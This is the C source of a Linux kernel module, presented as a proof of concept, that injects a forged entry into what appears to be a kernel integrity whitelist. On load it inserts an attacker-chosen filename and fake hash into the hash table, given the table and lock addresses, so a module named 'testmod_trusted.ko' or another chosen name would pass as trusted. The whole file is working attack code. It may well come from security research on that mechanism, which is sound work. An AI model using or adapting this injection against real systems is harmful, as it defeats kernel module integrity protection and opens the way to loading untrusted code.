// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_whitelist_inject"
#define POC_DESC "inte poc direct whitelist injection"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);
#include <linux/hashtable.h>
#include <linux/jhash.h>
#include <linux/rwlock.h>

#define POC_HASH_BITS 10

struct poc_hash_node {
	char filename[40];
	unsigned char hash[32];
	struct hlist_node node;
};

static struct poc_hash_node *injected;

static int __init poc_init(void)
{
	unsigned char hash[32];
	struct hlist_head *table;
	rwlock_t *lock;
	const char *name = poc_target_name ? poc_target_name : "testmod_trusted.ko";
	u32 key;
	u32 bucket;
	unsigned long flags;

	if (!poc_hash_table || !poc_hash_table_lock || !poc_fake_hash)
		return -EINVAL;
	if (poc_hex_to_bytes(poc_fake_hash, hash, sizeof(hash)))
		return -EINVAL;

	injected = kzalloc(sizeof(*injected), GFP_KERNEL);
	if (!injected)
		return -ENOMEM;
	strncpy(injected->filename, name, sizeof(injected->filename) - 1);
	memcpy(injected->hash, hash, sizeof(hash));
	INIT_HLIST_NODE(&injected->node);

	table = (struct hlist_head *)poc_hash_table;
	lock = (rwlock_t *)poc_hash_table_lock;
	key = jhash(injected->filename, strlen(injected->filename), 0);
	bucket = hash_min(key, POC_HASH_BITS);

	write_lock_irqsave(lock, flags);
	hlist_add_head(&injected->node, &table[bucket]);
	write_unlock_irqrestore(lock, flags);
	poc_info("injected %s", injected->filename);
	return 0;
}

static void __exit poc_exit(void)
{
	unsigned long flags;

	if (!injected)
		return;
	write_lock_irqsave((rwlock_t *)poc_hash_table_lock, flags);
	hlist_del(&injected->node);
	write_unlock_irqrestore((rwlock_t *)poc_hash_table_lock, flags);
	kfree(injected);
	injected = NULL;
}

module_init(poc_init);
module_exit(poc_exit);
